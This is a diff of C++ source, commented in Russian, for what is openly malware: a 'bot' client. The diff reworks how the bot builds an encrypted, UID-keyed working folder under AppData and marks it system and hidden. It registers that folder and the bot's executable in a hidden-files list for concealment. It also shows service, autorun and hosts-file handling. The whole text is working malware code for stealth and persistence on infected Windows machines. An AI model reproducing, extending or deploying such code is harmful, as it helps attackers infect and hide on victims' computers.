@@ -38,15 +38,14 @@ namespace COREDEBUGSTRINGS
 
 
 
-class TBotData : public TBotObject
+struct TBotData
 {
-public:
 	TProcessType ProcessType;  // Тип запущенного процесса
 
-
 	string  BotPath;     // Каталог бота
+	string  WorkPath;
 	string  BotExeName;  // Полное имя ехе бота
-	string  BotShortLinkName; // Имя файла ярлыка
+	//string  BotShortLinkName; // Имя файла ярлыка
 
     // Данные для работы сервиса
 	string                ServiceName;
@@ -101,6 +100,89 @@ DWORD BotServiceExeNameHash = 0; // Хэш имени сервиса бота
 char BOT_UID[128];
 
 
+
+
+//Внутренние методы пространства имён BOT
+namespace BOT
+{
+	PCHAR  MakeWorkFolder(); // Функция возвращает имя рабочего каталога бота
+	string MakeWorkPath();   // Функция генерирует полный рабочий путь
+}
+
+
+//-------------------------------------------
+// MakeWorkFolder - Функция генерирует имя
+//                  рабочего каталога бота
+//                  (короткое имя)
+//-------------------------------------------
+PCHAR BOT::MakeWorkFolder()
+{
+	if (!STRA::IsEmpty(BOT_WORK_FOLDER_NAME))
+		return BOT_WORK_FOLDER_NAME;
+
+	// Генерируем имя на основе константы обработанной ключём из уида
+	string WorkPath = GetStr(StrBotWorkPath);
+
+	PCHAR Name = UIDCrypt::CryptFileName((PCHAR)WorkPath.t_str(), false);
+
+	// Копируем путь в глобальный массив
+	const char *Buf = (Name) ? Name : WorkPath.t_str();
+
+	DWORD ToCopy = Min(MAX_BOT_WORK_FOLDER_LEN, STRA::Length(Buf));
+
+	m_memcpy(BOT_WORK_FOLDER_NAME, Buf, ToCopy);
+	BOT_WORK_FOLDER_NAME[ToCopy] = 0;
+
+	STR::Free(Name);
+
+	// Расчитываем хэш
+	BotWorkPathHash = STRA::Hash(BOT_WORK_FOLDER_NAME);
+	// Добавляем папку в список скрытых файлов
+	BOT::AddHiddenFile(BotWorkPathHash);
+
+	return BOT_WORK_FOLDER_NAME;
+}
+
+
+//-------------------------------------------
+// MakeWorkPath - Функция генерирует полный
+//                путь к рабочему каталогу
+//                бота
+//-------------------------------------------
+string BOT::MakeWorkPath()
+{
+	// Функция генерирует рабочий путь
+	string Result = GetBotPath();
+	Result += MakeWorkFolder();
+	Result += "\\";
+
+	if (!DirExists(Result.t_str()))
+	{
+		pCreateDirectoryA(Result.t_str(), NULL);
+		pSetFileAttributesA(Result.t_str(), FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
+    }
+	return Result;
+}
+//----------------------------------------------------------------------------
+
+
+
+//-------------------------------------------
+// WorkPath - Функция возвращает полный путь
+//            рабочего каталога бота
+//-------------------------------------------
+string BOT::WorkPath()
+{
+	// Путь к рабочему каталогу бота, привязан  к текущему пользователю
+	if (BotData->WorkPath.IsEmpty())
+		BotData->WorkPath = MakeWorkPath();
+	return BotData->WorkPath;
+}
+
+
+
+
+
 //****************************************************************************
 //                              TBotApplication
 //****************************************************************************
@@ -122,9 +204,6 @@ TBotApplication::TBotApplication()
 	pGetModuleFileNameA(NULL, Buf.Buf(), MAX_PATH);
 	FApplicationName = Buf.AsStr();
 	FApplicationName.LowerCase();
-
-	// Генерируем рабочие пути
-	FWorkPath = MakeWorkPath();
 
 	// Получаем идентификатор бота
 	FUID = GenerateBotID2();
@@ -168,13 +247,6 @@ string TBotApplication::ApplicationName()
 //-------------------------------------------------------------
 
 
-string TBotApplication::WorkPath()
-{
-	// Путь к рабочему каталогу бота, привязан  к текущему пользователю
-	return FWorkPath;
-}
-//-------------------------------------------------------------
-
 string TBotApplication::MakePath(const char* SubDirectory)
 {
 	// Функция собирает путь с указанной поддиректорией
@@ -182,7 +254,7 @@ string TBotApplication::MakePath(const char* SubDirectory)
 	// Функция не поддерживает вложенные поддиректории.
 	// ДЛя обеспечения уникальности, имя директории шифруется
 
-	string Path = WorkPath();
+	string Path = BOT::WorkPath();
 
 	if (!STRA::IsEmpty(SubDirectory))
 	{
@@ -283,59 +355,13 @@ string TBotApplication::PrefixFileName()
 //----------------------------------------------------------------------------
 
 
-PCHAR TBotApplication::GetWorkFolder()
-{
-	// Функция возвращает рабочий каталог бота (короткое имя)
-
-	if (!STR::IsEmpty(BOT_WORK_FOLDER_NAME))
-		return BOT_WORK_FOLDER_NAME;
-
-	// Генерируем имя на основе константы обработанной ключём из уида
-	string WorkPath = GetStr(StrBotWorkPath);
-
-	PCHAR Name = UIDCrypt::CryptFileName((PCHAR)WorkPath.t_str(), false);
-
-	// Копируем путь в глобальный массив
-	const char *Buf = (Name) ? Name : WorkPath.t_str();
-
-	DWORD ToCopy = Min(MAX_BOT_WORK_FOLDER_LEN, STRA::Length(Buf));
-
-	m_memcpy(BOT_WORK_FOLDER_NAME, Buf, ToCopy);
-	BOT_WORK_FOLDER_NAME[ToCopy] = 0;
-
-	STR::Free(Name);
-
-	// Расчитываем хэш
-	BotWorkPathHash = STRA::Hash(BOT_WORK_FOLDER_NAME);
-	// Добавляем папку в список скрытых файлов
-	BOT::AddHiddenFile(BotWorkPathHash);
-
-	return BOT_WORK_FOLDER_NAME;
-}
-//----------------------------------------------------------------------------
-
-string TBotApplication::MakeWorkPath()
-{
-	// Функция генерирует рабочий путь
-	string Result = BOT::GetBotPath();
-	Result += GetWorkFolder();
-	Result += "\\";
-
-	if (!DirExists(Result.t_str()))
-		pCreateDirectoryA(Result.t_str(), NULL);
-	pSetFileAttributesA(Result.t_str(), FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
-
-
-	return Result;
-}
-//----------------------------------------------------------------------------
 
 
 PCHAR BOTDoGetWorkPath(bool InSysPath, PCHAR SubDir, PCHAR FileName)
 {
 	// Функция возвращает рабочий каталог бота
 
-	string Path = Bot->WorkPath();
+	string Path = BOT::WorkPath();
 
 	if (Path.IsEmpty()) return NULL;
 
@@ -357,6 +383,7 @@ PCHAR BOTDoGetWorkPath(bool InSysPath, PCHAR SubDir, PCHAR FileName)
 
 	return  Result;
 }
+
 //----------------------------------------------------------------------------
 
 
@@ -579,8 +606,9 @@ void BOT::Initialize(TProcessType ProcessType)
 	InitializeAPI();
 
 	//Создаём глобальные объекты бота
-	BotData = new TBotData();
-    Bot     = new TBotApplication();
+	BotData = CreateStruct(TBotData);
+
+	Bot     = new TBotApplication();
 
 
 	// Инициализиуем глобальные данные бота
@@ -589,7 +617,7 @@ void BOT::Initialize(TProcessType ProcessType)
 	BotData->ProcessType = (CheckIsService()) ? ProcessService : ProcessType;
 
 	// Создаём имя рабочей папки
-	GetWorkFolderHash();
+	MakeWorkFolder();
 
 	GenerateUid(BOT_UID);
 
@@ -620,25 +648,17 @@ string BOT::GetBotPath()
 {
 	if (BotData->BotPath.IsEmpty())
 	{
-
 		int CSIDL =  CSIDL_COMMON_APPDATA;
-
 		// Временный патч. В Висте и старше получаем папку текущего юзера
 		#ifdef USE_CURRENT_USER
 			OSVERSIONINFOEXA OSVersion;
-
 			OSVersion.dwOSVersionInfoSize = sizeof( OSVERSIONINFOEXA );
-
 			if (pGetVersionExA( (OSVERSIONINFOA*)&OSVersion ) )
 			{
-				if ( OSVersion.dwMajorVersion >= 6 )
-				{
+				if ( OSVersion.dwMajorVersion >= 6)
 					CSIDL =  CSIDL_APPDATA;
-				}
 			}
         #endif
-
-
 		// Создаём путь
 		BotData->BotPath =  GetSpecialFolderPathA(CSIDL, NULL);
 	}
@@ -653,13 +673,13 @@ PCHAR BOT::GetWorkPath(PCHAR SubDir, PCHAR FileName)
 }
 //----------------------------------------------------------------------------
 
-PCHAR BOT::GetWorkPathInSysDrive(PCHAR SubDir, PCHAR FileName)
-{
-	//  Аналог функции GetWorkPath.
-	//  Главное от личие от неё в том, что пусть
-	//   создаётся в корне системного диска
-    return BOTDoGetWorkPath(true, SubDir, FileName);
-}
+//PCHAR BOT::GetWorkPathInSysDrive(PCHAR SubDir, PCHAR FileName)
+//{
+//	//  Аналог функции GetWorkPath.
+//	//  Главное от личие от неё в том, что пусть
+//	//   создаётся в корне системного диска
+//    return BOTDoGetWorkPath(true, SubDir, FileName);
+//}
 //----------------------------------------------------------------------------
 
 DWORD BOT::GetWorkFolderHash()
@@ -713,7 +733,8 @@ PCHAR BOT::GetBotExeName()
 
 		// Добавляем имя в список скрываемых фалов
 		AddHiddenFile(BotExeNameHash);
-		GetBotLinkName(); // Добавляем имя ярлыка в список скрываемых файлов
+
+		//GetBotLinkName(); // Добавляем имя ярлыка в список скрываемых файлов
 	}
 
 
@@ -725,17 +746,17 @@ PCHAR BOT::GetBotExeName()
 //  GetBotLinkName - Функция возвращает имя файла
 //     				 ярлыка бота
 //----------------------------------------------------
-string BOT::GetBotLinkName()
-{
-	if (BotData->BotShortLinkName.IsEmpty())
-	{
-		PCHAR Link = UIDCrypt::CryptFileName(GetStr(EStrBotStartupLinkName).t_str(), false);
-		BotData->BotShortLinkName = Link;
-		AddHiddenFile(Link);
-		STR::Free(Link);
-    }
-	return BotData->BotShortLinkName;
-}
+//string BOT::GetBotLinkName()
+//{
+//	if (BotData->BotShortLinkName.IsEmpty())
+//	{
+//		PCHAR Link = UIDCrypt::CryptFileName(GetStr(EStrBotStartupLinkName).t_str(), false);
+//		BotData->BotShortLinkName = Link;
+//		AddHiddenFile(Link);
+//		STR::Free(Link);
+//    }
+//	return BotData->BotShortLinkName;
+//}
 //----------------------------------------------------------------------------
 
 DWORD BOT::GetBotExeNameHash()
@@ -1126,7 +1147,7 @@ void BOT::DeleteAutorunBot()
 PCHAR BOT::GetHostsFileName()
 {
 	// Функция возвращает имя файла основного списка хостов бота
-	return BOT::GetWorkPathInSysDrive(NULL, GetStr(EStrHostsFileName).t_str());
+	return BOT::GetWorkPath(NULL, GetStr(EStrHostsFileName).t_str());
  }
 //---------------------------------------------------------------------------
 
